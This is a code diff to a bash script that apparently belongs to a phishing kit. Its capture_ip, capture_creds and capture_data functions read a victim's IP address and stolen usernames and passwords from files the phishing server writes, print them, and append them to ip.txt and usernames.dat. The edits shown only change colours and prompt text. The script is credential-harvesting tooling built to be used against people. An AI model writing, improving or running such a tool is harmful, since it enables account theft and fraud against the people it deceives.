@@ -202,27 +202,26 @@ setup_site() {
 ## Get IP address
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-	IFS=$'\n'
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${BLUE}$IP"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in: ${BLUE}ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in: ${MAGENTA}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
-	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in : ${BLUE}usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in : ${MAGENTA}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Information, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			capture_ip
